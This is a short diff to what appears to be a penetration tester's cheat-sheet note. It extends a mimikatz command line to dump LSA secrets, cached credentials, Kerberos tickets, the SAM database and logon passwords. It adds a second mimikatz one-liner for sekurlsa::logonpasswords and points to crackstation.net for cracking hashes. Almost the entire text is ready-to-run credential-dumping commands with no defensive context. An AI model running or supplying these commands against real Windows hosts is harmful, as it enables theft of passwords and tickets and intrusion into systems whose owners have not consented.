@@ -22,9 +22,12 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ```
-.\mimikatz.exe "privilege::debug" "lsadump::secrets" "lsadump::cache" "exit"
+.\mimikatz.exe "privilege::debug" "lsadump::secrets" "lsadump::cache" "sekurlsa::tickets" "lsadump::sam" "sekurlsa::logonpasswords" "exit"
 ```
 
+```
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
 crackstation.net
 
 ---
